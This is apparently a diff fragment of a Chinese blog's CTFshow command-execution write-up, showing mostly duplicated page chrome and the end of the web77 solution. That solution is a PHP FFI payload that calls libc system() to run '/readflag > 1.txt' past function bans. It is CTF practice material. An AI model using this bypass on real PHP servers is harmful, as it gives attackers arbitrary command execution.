+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101123147447.png" alt="image-20221101123147447"></p><h2 id="web77"><a class="anchor" href="#web77">#</a> web77</h2><p>上面的方法都 ban 了，使用 FFI</p><pre><code class="language-php">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);
+$a='/readflag &gt; 1.txt';
 $ffi-&gt;system($a);
-</code></pre><p>再去访问1.txt即可</p><div class="tags"><a href="/tags/rce/" rel="tag"><i class="ic i-tag"></i> rce</a></div></div><footer><div class="meta"><span id="2022/11/01/命令执行/" class="item leancloud_visitors" data-flag-title="CTFshow-web入门命令执行" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow-web入门命令执行">https://blog.xcu.icu/2022/11/01/命令执行/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/10/31/CSRF&SSRF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;128.jpg" title="CSRF&amp;SSRF"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Web</span><h3>CSRF&SSRF</h3></a></div><div class="item right"><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;154.jpg" title="CTFshow-web入门命令执行补充"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> CTFshow</span><h3>CTFshow-web入门命令执行补充</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">5.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">6.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">7.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">8.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">9.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">10.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">11.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">12.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">13.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">14.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47"><span class="toc-number">15.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">16.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">17.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">18.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">19.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">20.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">21.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58"><span class="toc-number">22.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web59"><span class="toc-number">23.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71"><span class="toc-number">24.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">25.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web75"><span class="toc-number">26.</span> <span class="toc-text">web75</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web77"><span class="toc-number">27.</span> <span class="toc-text">web77</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="CTFshow-web入门信息收集">CTFshow-web入门信息收集</a></li><li><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" rel="bookmark" title="CTFshow-web入门命令执行补充">CTFshow-web入门命令执行补充</a></li><li class="active"><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="CTFshow-web入门命令执行">CTFshow-web入门命令执行</a></li><li><a href="/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></li><li><a href="/2023/02/15/php%E7%89%B9%E6%80%A7/" rel="bookmark" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></li><li><a href="/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="CTFshow-web入门php反序列化">CTFshow-web入门php反序列化</a></li><li><a href="/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="yii反序列化">yii反序列化</a></li><li><a href="/2023/07/14/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="bookmark" title="JavaScript原型链污染">JavaScript原型链污染</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">54</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">39</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/10/31/CSRF&SSRF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/" title="数据库系统概述">数据库系统概述</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" title="php反序列化">php反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%A4%E8%80%81%E7%9A%84%E9%9D%B6%E6%9C%BAmedium_socnet%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="记一次古老的靶机medium_socnet的打靶记录">记一次古老的靶机medium_socnet的打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" title="基于sqli-labs进阶学习">基于sqli-labs进阶学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS跨站脚本攻击">XSS跨站脚本攻击</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CTFshow-web入门php反序列化">CTFshow-web入门php反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/REVERSE/" title="分类于 REVERSE">REVERSE</a></div><span><a href="/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/" title="小端序标记法">小端序标记法</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/" title="自用一些简单脚本记录">自用一些简单脚本记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2023/03/01/nosql/" title="nosql学习笔记">nosql学习笔记</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" title="关系数据库">关系数据库</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">578k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:45</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/11/01/命令执行/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
+</code></pre><p>再去访问 1.txt 即可</p><div class="tags"><a href="/tags/rce/" rel="tag"><i class="ic i-tag"></i> rce</a></div></div><footer><div class="meta"><span id="2022/11/01/命令执行/" class="item leancloud_visitors" data-flag-title="CTFshow-web入门命令执行" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow-web入门命令执行">https://blog.xcu.icu/2022/11/01/命令执行/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/10/31/CSRF&SSRF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;34.jpg" title="CSRF&amp;SSRF"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Web</span><h3>CSRF&SSRF</h3></a></div><div class="item right"><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;74.jpg" title="CTFshow-web入门命令执行补充"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> CTFshow</span><h3>CTFshow-web入门命令执行补充</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">5.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">6.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">7.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">8.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">9.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">10.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">11.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">12.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">13.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">14.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47"><span class="toc-number">15.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">16.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">17.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">18.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">19.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">20.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">21.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58"><span class="toc-number">22.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web59"><span class="toc-number">23.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71"><span class="toc-number">24.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">25.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web75"><span class="toc-number">26.</span> <span class="toc-text">web75</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web77"><span class="toc-number">27.</span> <span class="toc-text">web77</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="CTFshow-web入门信息收集">CTFshow-web入门信息收集</a></li><li><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" rel="bookmark" title="CTFshow-web入门命令执行补充">CTFshow-web入门命令执行补充</a></li><li class="active"><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="CTFshow-web入门命令执行">CTFshow-web入门命令执行</a></li><li><a href="/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></li><li><a href="/2023/02/15/php%E7%89%B9%E6%80%A7/" rel="bookmark" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></li><li><a href="/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="CTFshow-web入门php反序列化">CTFshow-web入门php反序列化</a></li><li><a href="/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="yii反序列化">yii反序列化</a></li><li><a href="/2023/07/14/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="bookmark" title="JavaScript原型链污染">JavaScript原型链污染</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">54</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">39</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/10/31/CSRF&SSRF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" title="DNS服务器">DNS服务器</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" title="关系数据库">关系数据库</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Python/" title="分类于 Python">Python</a></div><span><a href="/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python的序列化和反序列化">python的序列化和反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/05/24/CommonsCollections-6/" title="ConmonsCollection-6">ConmonsCollection-6</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/10/24/samba%E5%85%B1%E4%BA%AB/" title="Samba共享">Samba共享</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/" title="preg_match&amp;&amp;正则">preg_match&&正则</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/02/15/php%E7%89%B9%E6%80%A7/" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2022/11/04/Billu_b0x%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Billu_b0x打靶记录">Billu_b0x打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91/" title="分类于 内网">内网</a></div><span><a href="/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网信息收集">内网信息收集</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">565k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:34</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/11/01/命令执行/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
